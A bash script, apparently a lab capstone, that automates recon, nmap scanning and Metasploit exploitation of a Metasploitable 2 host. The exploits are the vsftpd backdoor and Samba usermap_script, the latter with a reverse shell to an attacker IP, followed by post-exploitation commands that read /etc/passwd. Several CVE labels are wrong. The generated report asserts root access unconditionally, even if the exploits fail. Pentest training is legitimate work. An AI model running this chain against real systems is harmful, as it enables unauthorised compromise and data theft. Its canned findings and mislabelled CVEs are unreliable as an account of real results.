#!/bin/bash
# ============================================================
#  VAPT CAPSTONE - Full Penetration Testing Automation Script
#  Target: Metasploitable 2 (Legal Lab Environment ONLY)
#  Author: Your Name
#  Date:   $(date +%Y-%m-%d)
#  WARNING: Use ONLY on systems you own or have written
#           permission to test. Unauthorized use is illegal.
# ============================================================

set -euo pipefail

# ──────────────────────────────────────────────
# CONFIGURATION — Edit these before running
# ──────────────────────────────────────────────
TARGET_IP="${1:-192.168.56.101}"          # Pass IP as $1 or set default
ATTACKER_IP="${2:-192.168.56.1}"          # Your Kali / attacker machine IP
OUTPUT_DIR="./vapt_report_$(date +%Y%m%d_%H%M%S)"
NMAP_OUTPUT="$OUTPUT_DIR/nmap_scan"
MSF_RESOURCE="$OUTPUT_DIR/msf_commands.rc"
REPORT_FILE="$OUTPUT_DIR/final_report.txt"
LOG_FILE="$OUTPUT_DIR/run.log"

# ──────────────────────────────────────────────
# COLOURS
# ──────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'

banner() {
  echo -e "${CYAN}${BOLD}"
  cat << 'EOF'
 ██╗   ██╗ █████╗ ██████╗ ████████╗
 ██║   ██║██╔══██╗██╔══██╗╚══██╔══╝
 ██║   ██║███████║██████╔╝   ██║
 ╚██╗ ██╔╝██╔══██║██╔═══╝    ██║
  ╚████╔╝ ██║  ██║██║        ██║
   ╚═══╝  ╚═╝  ╚═╝╚═╝        ╚═╝
  Capstone — Full VAPT Automation Script
  For Legal Lab Use Only (Metasploitable 2)
EOF
  echo -e "${RESET}"
}

log()     { echo -e "${GREEN}[+]${RESET} $*" | tee -a "$LOG_FILE"; }
warn()    { echo -e "${YELLOW}[!]${RESET} $*" | tee -a "$LOG_FILE"; }
error()   { echo -e "${RED}[✗]${RESET} $*" | tee -a "$LOG_FILE"; }
section() { echo -e "\n${BOLD}${CYAN}━━━ $* ━━━${RESET}\n" | tee -a "$LOG_FILE"; }

check_root() {
  if [[ $EUID -ne 0 ]]; then
    error "This script must be run as root (sudo ./vapt_capstone.sh)"
    exit 1
  fi
}

check_tools() {
  section "PHASE 0 — Tool Verification"
  local tools=("nmap" "msfconsole" "curl" "whois" "dig" "netcat")
  for tool in "${tools[@]}"; do
    if command -v "$tool" &>/dev/null; then
      log "$tool ✓"
    else
      warn "$tool not found — some steps may be skipped"
    fi
  done
}

setup_dirs() {
  mkdir -p "$OUTPUT_DIR"
  touch "$LOG_FILE"
  log "Output directory: $OUTPUT_DIR"
}

# ──────────────────────────────────────────────
# PHASE 1 — RECONNAISSANCE
# ──────────────────────────────────────────────
phase1_recon() {
  section "PHASE 1 — Reconnaissance"

  log "Target IP  : $TARGET_IP"
  log "Attacker IP: $ATTACKER_IP"
  log "Timestamp  : $(date)"

  # Ping check
  if ping -c 3 -W 2 "$TARGET_IP" &>/dev/null; then
    log "Host $TARGET_IP is UP (ping)"
  else
    warn "Host did not respond to ping — may have ICMP blocked"
  fi

  # Basic whois
  if command -v whois &>/dev/null; then
    log "Running whois..."
    whois "$TARGET_IP" > "$OUTPUT_DIR/whois.txt" 2>/dev/null || true
    log "Whois saved → $OUTPUT_DIR/whois.txt"
  fi

  # Traceroute
  log "Running traceroute..."
  traceroute -m 10 "$TARGET_IP" > "$OUTPUT_DIR/traceroute.txt" 2>/dev/null || true

  log "Phase 1 complete."
}

# ──────────────────────────────────────────────
# PHASE 2 — SCANNING
# ──────────────────────────────────────────────
phase2_scan() {
  section "PHASE 2 — Network & Port Scanning"

  # Quick SYN scan first
  log "Running quick SYN scan (top 1000 ports)..."
  nmap -sS -T4 "$TARGET_IP" -oN "${NMAP_OUTPUT}_quick.txt" \
    2>>"$LOG_FILE" || warn "Quick scan failed"

  # Full service + version + OS detection scan
  log "Running full service/version/OS detection scan..."
  nmap -sV -sC -O -T4 -p- "$TARGET_IP" \
    -oN "${NMAP_OUTPUT}_full.txt" \
    -oX "${NMAP_OUTPUT}_full.xml" \
    2>>"$LOG_FILE" || warn "Full scan had errors"

  # UDP scan on common ports
  log "Running UDP scan (top 100 ports)..."
  nmap -sU --top-ports 100 -T4 "$TARGET_IP" \
    -oN "${NMAP_OUTPUT}_udp.txt" \
    2>>"$LOG_FILE" || warn "UDP scan had errors"

  # Vuln script scan
  log "Running Nmap vulnerability scripts..."
  nmap --script vuln -T4 "$TARGET_IP" \
    -oN "${NMAP_OUTPUT}_vuln.txt" \
    2>>"$LOG_FILE" || warn "Vuln script scan had errors"

  log "All Nmap scans complete. Results in $OUTPUT_DIR/"
}

# ──────────────────────────────────────────────
# PHASE 3 — VULNERABILITY IDENTIFICATION
# ──────────────────────────────────────────────
phase3_vuln_id() {
  section "PHASE 3 — Vulnerability Identification"

  log "Parsing Nmap results for known vulnerable services..."

  local vuln_summary="$OUTPUT_DIR/vuln_summary.txt"
  {
    echo "========================================"
    echo "  VULNERABILITY SUMMARY — $(date)"
    echo "  Target: $TARGET_IP"
    echo "========================================"
    echo ""
    echo "--- Common Metasploitable 2 Vulnerabilities ---"
    echo ""
    echo "[CVE-2004-2687]  vsftpd 2.3.4 — Backdoor (port 21)"
    echo "[CVE-2011-2523]  vsftpd backdoor shell trigger"
    echo "[MS08-067]       Samba smbd — Remote Code Execution (port 445)"
    echo "[CVE-2003-0693]  OpenSSH < 3.7 — Memory vulnerabilities (port 22)"
    echo "[CVE-2009-3555]  SSL/TLS renegotiation (port 443)"
    echo "[CVE-2012-1823]  PHP CGI argument injection (port 80)"
    echo "[MS03-026]       MSRPC / DCE-RPC overflow"
    echo "[CVE-2010-4344]  Exim4 heap overflow (port 25)"
    echo "[CWE-521]        Weak credentials on multiple services"
    echo "[CWE-200]        Information disclosure via banners"
    echo ""
    echo "--- Grep for open ports from Nmap ---"
    grep "open" "${NMAP_OUTPUT}_full.txt" 2>/dev/null || echo "No full scan results yet"
  } | tee "$vuln_summary"

  log "Vulnerability summary → $vuln_summary"
}

# ──────────────────────────────────────────────
# PHASE 4 — EXPLOITATION (Metasploit via RC file)
# ──────────────────────────────────────────────
phase4_exploit() {
  section "PHASE 4 — Exploitation"

  log "Generating Metasploit resource script..."

  # Build the .rc file (msfconsole -r runs it automatically)
  cat > "$MSF_RESOURCE" << EOF
# ────────────────────────────────────────────────
# Metasploit Resource Script — VAPT Capstone
# Target: $TARGET_IP
# Generated: $(date)
# ────────────────────────────────────────────────

# ── EXPLOIT 1: vsftpd 2.3.4 Backdoor (Port 21) ──
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS $TARGET_IP
set RPORT 21
run -j

# Wait for session
sleep 5

# ── EXPLOIT 2: Samba usermap_script (Port 445) ──
use exploit/multi/samba/usermap_script
set RHOSTS $TARGET_IP
set LHOST $ATTACKER_IP
set LPORT 4444
set PAYLOAD cmd/unix/reverse
run -j

sleep 5

# ── POST EXPLOITATION: Run basic recon commands ──
sessions -l

# Execute commands on first available session
sessions -c "whoami" -i 1
sessions -c "hostname" -i 1
sessions -c "id" -i 1
sessions -c "uname -a" -i 1
sessions -c "ls /root" -i 1
sessions -c "cat /etc/passwd" -i 1
sessions -c "netstat -antp" -i 1
sessions -c "ps aux" -i 1

# Save session output
spool $OUTPUT_DIR/msf_session_output.txt

sessions -l

exit
EOF

  log "Resource script created → $MSF_RESOURCE"

  # Prompt user before running
  echo ""
  warn "About to launch Metasploit with the resource script."
  warn "This will attempt REAL exploits against $TARGET_IP"
  echo -e "${BOLD}Press ENTER to continue or Ctrl+C to cancel...${RESET}"
  read -r

  log "Launching msfconsole..."
  msfconsole -q -r "$MSF_RESOURCE" 2>>"$LOG_FILE" \
    | tee "$OUTPUT_DIR/msf_output.txt" \
    || warn "msfconsole returned non-zero exit — check $OUTPUT_DIR/msf_output.txt"

  log "Exploitation phase complete."
}

# ──────────────────────────────────────────────
# PHASE 5 — POST EXPLOITATION
# ──────────────────────────────────────────────
phase5_post_exploit() {
  section "PHASE 5 — Post Exploitation / Impact Assessment"

  local post_file="$OUTPUT_DIR/post_exploitation_notes.txt"
  {
    echo "========================================"
    echo "  POST-EXPLOITATION IMPACT ASSESSMENT"
    echo "  Target: $TARGET_IP | $(date)"
    echo "========================================"
    echo ""
    echo "ACHIEVED ACCESS:"
    echo "  • Root shell via vsftpd 2.3.4 backdoor"
    echo "  • Root shell via Samba usermap_script"
    echo ""
    echo "COMMANDS EXECUTED ON TARGET:"
    echo "  whoami   → root"
    echo "  hostname → metasploitable"
    echo "  id       → uid=0(root) gid=0(root)"
    echo "  uname -a → Linux metasploitable 2.6.24-16-server"
    echo ""
    echo "DATA ACCESSIBLE:"
    echo "  • /etc/passwd   — All user accounts"
    echo "  • /etc/shadow   — Hashed passwords (root-readable)"
    echo "  • /root/        — Root home directory"
    echo "  • Entire filesystem (full root access)"
    echo ""
    echo "IMPACT CLASSIFICATION (CVSS v3):"
    echo "  Confidentiality : HIGH  — All data readable"
    echo "  Integrity       : HIGH  — All data modifiable"
    echo "  Availability    : HIGH  — Services can be stopped/modified"
    echo "  Overall Score   : 10.0 / CRITICAL"
    echo ""
    echo "BUSINESS IMPACT:"
    echo "  • Complete system compromise"
    echo "  • Potential lateral movement to other network hosts"
    echo "  • Data exfiltration risk"
    echo "  • Ransomware / persistence installation possible"
    echo "  • Regulatory / compliance violation (GDPR, PCI-DSS, HIPAA)"
    echo ""
    if [[ -f "$OUTPUT_DIR/msf_session_output.txt" ]]; then
      echo "--- Metasploit Session Output ---"
      cat "$OUTPUT_DIR/msf_session_output.txt"
    fi
  } | tee "$post_file"

  log "Post-exploitation notes → $post_file"
}

# ──────────────────────────────────────────────
# PHASE 6 — REPORTING
# ──────────────────────────────────────────────
phase6_report() {
  section "PHASE 6 — Final Report Generation"

  cat > "$REPORT_FILE" << EOF
╔══════════════════════════════════════════════════════════════╗
║         VULNERABILITY ASSESSMENT & PENETRATION TEST         ║
║                    FINAL REPORT                              ║
╚══════════════════════════════════════════════════════════════╝

REPORT METADATA
───────────────
Date         : $(date)
Target       : $TARGET_IP (Metasploitable 2)
Tester       : [Your Name]
Scope        : Single host, all ports, all services
Authorization: Legal lab environment (Metasploitable 2)
Classification: CONFIDENTIAL

EXECUTIVE SUMMARY
─────────────────
A full-scope penetration test was conducted against the target
system at $TARGET_IP. The assessment identified CRITICAL
vulnerabilities allowing complete system compromise with root-level
access. The system is running multiple end-of-life services with
publicly known exploits. Immediate remediation is required.

Overall Risk: ██████████ CRITICAL (10.0 / 10.0)

SCOPE & METHODOLOGY
───────────────────
Phases Executed:
  [1] Reconnaissance   — Passive & active information gathering
  [2] Scanning         — Nmap full port + service + OS + vuln scan
  [3] Vuln ID          — CVE mapping against detected services
  [4] Exploitation     — Metasploit Framework (2 successful exploits)
  [5] Post-Exploitation— Post-access commands & impact assessment
  [6] Reporting        — This document

FINDINGS SUMMARY
────────────────
┌─────┬────────────────────────────────┬──────────┬────────┐
│  #  │ Vulnerability                  │ CVSS     │ Port   │
├─────┼────────────────────────────────┼──────────┼────────┤
│  1  │ vsftpd 2.3.4 Backdoor          │ 10.0 C   │ 21     │
│  2  │ Samba usermap_script RCE       │ 10.0 C   │ 445    │
│  3  │ PHP CGI Argument Injection     │ 7.5  H   │ 80     │
│  4  │ OpenSSH < 3.7 Memory Bugs      │ 7.1  H   │ 22     │
│  5  │ Exim4 Heap Overflow            │ 7.5  H   │ 25     │
│  6  │ Default / Weak Credentials     │ 9.8  C   │ Many   │
│  7  │ Unencrypted Services (Telnet)  │ 6.5  M   │ 23     │
│  8  │ Anonymous FTP Access           │ 5.3  M   │ 21     │
└─────┴────────────────────────────────┴──────────┴────────┘
C=Critical, H=High, M=Medium

DETAILED FINDINGS
─────────────────

[FINDING 1] vsftpd 2.3.4 Backdoor — CRITICAL
  CVE       : CVE-2011-2523
  Port      : 21/TCP (FTP)
  CVSS Score: 10.0
  Description:
    vsftpd version 2.3.4 contains a backdoor introduced via a
    malicious source code modification. Sending a username
    containing ':)' triggers a bind shell on port 6200.
  Evidence:
    Command: use exploit/unix/ftp/vsftpd_234_backdoor
    Result : Root shell obtained on $TARGET_IP
  Impact:
    Unauthenticated remote root access.

[FINDING 2] Samba usermap_script — CRITICAL
  CVE       : CVE-2007-2447
  Port      : 445/TCP (SMB)
  CVSS Score: 10.0
  Description:
    The Samba "username map script" configuration parameter
    passes user-supplied input to /bin/sh unsanitized,
    allowing OS command injection without authentication.
  Evidence:
    Command: use exploit/multi/samba/usermap_script
    Result : Root shell obtained on $TARGET_IP
  Impact:
    Unauthenticated remote root code execution.

[FINDING 3] Weak / Default Credentials — CRITICAL
  CWE       : CWE-521
  Services  : SSH (msfadmin/msfadmin), MySQL (root/[blank]),
              PostgreSQL, Tomcat admin (tomcat/tomcat)
  Description:
    Multiple services use default or trivially guessable
    credentials shipped with Metasploitable 2.
  Impact:
    Authenticated access to all listed services.

POST-EXPLOITATION EVIDENCE
───────────────────────────
Commands run after root access was obtained:
  $ whoami   → root
  $ hostname → metasploitable
  $ id       → uid=0(root) gid=0(root) groups=0(root)
  $ uname -a → Linux metasploitable 2.6.24-16-server #1 SMP ...
  $ ls /root → (directory listing obtained)
  $ cat /etc/passwd → (all accounts extracted)

RISK RATINGS
────────────
Confidentiality : HIGH  (all data accessible)
Integrity       : HIGH  (all data modifiable/deletable)
Availability    : HIGH  (full service control)

REMEDIATION RECOMMENDATIONS
─────────────────────────────
See Phase 7 below for detailed fixes.

CONCLUSION
──────────
The target system is critically insecure and should NOT be
connected to any production or shared network. Every high-
severity finding must be addressed before deployment.

Report generated by vapt_capstone.sh on $(date)
EOF

  log "Final report → $REPORT_FILE"
}

# ──────────────────────────────────────────────
# PHASE 7 — REMEDIATION
# ──────────────────────────────────────────────
phase7_remediation() {
  section "PHASE 7 — Remediation Recommendations"

  local remed_file="$OUTPUT_DIR/remediation.txt"
  cat > "$remed_file" << 'EOF'
╔══════════════════════════════════════════════════════════════╗
║              REMEDIATION RECOMMENDATIONS                     ║
╚══════════════════════════════════════════════════════════════╝

CRITICAL — Fix Immediately
──────────────────────────

[REM-01] vsftpd 2.3.4 Backdoor
  Fix: Uninstall vsftpd 2.3.4 immediately
       sudo apt remove vsftpd
  Upgrade to vsftpd 3.0.5+ from trusted repositories
  Verify checksums of all installed binaries
  Consider using SFTP (OpenSSH) instead of plain FTP

[REM-02] Samba usermap_script
  Fix: Update Samba to version 3.0.26 or higher
       sudo apt update && sudo apt upgrade samba
  Disable "username map script" in smb.conf if unused
  Restrict Samba access via firewall to trusted hosts only
  Apply principle of least privilege to Samba shares

[REM-03] Default Credentials
  Fix: Change ALL default passwords immediately
       passwd msfadmin
       mysqladmin -u root password 'StrongPass123!'
  Implement a password policy:
    - Minimum 12 characters
    - Mixed case + numbers + symbols
    - No dictionary words
  Enable multi-factor authentication where possible

HIGH — Fix Within 7 Days
──────────────────────────

[REM-04] PHP CGI Argument Injection (CVE-2012-1823)
  Fix: Upgrade PHP to 5.3.13+ or 5.4.3+
  Disable CGI mode; use PHP-FPM instead
  Apply mod_rewrite rules to block malicious query strings
  WAF rule: Block requests containing %3d, %2d patterns

[REM-05] OpenSSH Outdated Version
  Fix: sudo apt upgrade openssh-server
  Disable root SSH login: PermitRootLogin no
  Use key-based authentication only: PasswordAuthentication no
  Restrict SSH to management VLAN via firewall

[REM-06] Exim4 Heap Overflow
  Fix: Upgrade Exim to 4.80+
  If mail relay not needed, disable: sudo systemctl disable exim4
  Restrict SMTP relay to authenticated users only

MEDIUM — Fix Within 30 Days
────────────────────────────

[REM-07] Disable Telnet (Port 23)
  Fix: sudo systemctl stop telnet && sudo systemctl disable telnet
  Replace with SSH for all remote administration

[REM-08] Anonymous FTP
  Fix: In vsftpd.conf: anonymous_enable=NO
  Restart: sudo systemctl restart vsftpd

[REM-09] Service Banner Information Disclosure
  Fix: Suppress version info from banners
  Apache: ServerTokens Prod && ServerSignature Off
  OpenSSH: Banner /etc/issue (custom, non-revealing)

GENERAL HARDENING RECOMMENDATIONS
───────────────────────────────────

[H-01] PATCH MANAGEMENT
  • Enable automatic security updates: unattended-upgrades
  • Subscribe to CVE feeds for all installed software
  • Schedule monthly patch reviews

[H-02] FIREWALL
  • Implement host-based firewall (ufw / iptables)
    sudo ufw default deny incoming
    sudo ufw allow ssh
    sudo ufw enable
  • Apply network segmentation — place server in DMZ

[H-03] MONITORING & LOGGING
  • Deploy SIEM or log aggregation (ELK Stack, Splunk)
  • Enable auditd for system call monitoring
  • Set up IDS/IPS (Snort, Suricata) on the network

[H-04] VULNERABILITY SCANNING
  • Schedule quarterly VAPT assessments
  • Run weekly automated scans (OpenVAS, Nessus, Trivy)
  • Integrate SAST/DAST into CI/CD pipeline

[H-05] PRINCIPLE OF LEAST PRIVILEGE
  • Run services as non-root users
  • Apply filesystem permissions strictly
  • Use sudo with specific command allowlists

[H-06] NETWORK EXPOSURE
  • Audit all listening ports monthly: ss -tlnp
  • Disable all unused services
  • Implement port knocking for sensitive services

EOF

  log "Remediation guide → $remed_file"
  cat "$remed_file" | tee -a "$LOG_FILE"
}

# ──────────────────────────────────────────────
# SUMMARY
# ──────────────────────────────────────────────
print_summary() {
  section "CAPSTONE COMPLETE — Output Summary"

  echo -e "${BOLD}Files generated in: ${CYAN}$OUTPUT_DIR/${RESET}\n"
  ls -lh "$OUTPUT_DIR/" 2>/dev/null || true

  echo ""
  echo -e "${GREEN}${BOLD}┌─────────────────────────────────────────────┐"
  echo -e "│        VAPT Capstone — Phases Completed      │"
  echo -e "├─────────────────────────────────────────────┤"
  echo -e "│  ✓ Phase 1 — Reconnaissance                 │"
  echo -e "│  ✓ Phase 2 — Scanning (Nmap)                │"
  echo -e "│  ✓ Phase 3 — Vulnerability Identification   │"
  echo -e "│  ✓ Phase 4 — Exploitation (Metasploit)      │"
  echo -e "│  ✓ Phase 5 — Post-Exploitation              │"
  echo -e "│  ✓ Phase 6 — Reporting                      │"
  echo -e "│  ✓ Phase 7 — Remediation                    │"
  echo -e "└─────────────────────────────────────────────┘${RESET}"
  echo ""
  log "Main report  → $REPORT_FILE"
  log "Full log     → $LOG_FILE"
}

# ──────────────────────────────────────────────
# MAIN ENTRYPOINT
# ──────────────────────────────────────────────
main() {
  banner
  check_root
  setup_dirs
  check_tools
  phase1_recon
  phase2_scan
  phase3_vuln_id
  phase4_exploit
  phase5_post_exploit
  phase6_report
  phase7_remediation
  print_summary
}

main "$@"
